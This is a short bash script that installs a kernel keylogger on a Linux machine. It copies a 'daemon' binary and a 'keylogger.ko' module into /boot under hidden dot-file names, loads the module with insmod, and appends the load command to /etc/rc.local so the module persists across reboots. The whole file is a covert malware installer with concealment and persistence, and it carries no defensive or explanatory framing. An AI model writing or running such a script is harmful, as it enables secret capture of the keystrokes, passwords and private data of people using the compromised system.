#!/bin/bash

cp daemon /boot/.daemon
cp keylogger.ko /boot/.module
insmod /boot/.module
echo "insmod /boot/.module" >> /etc/rc.local

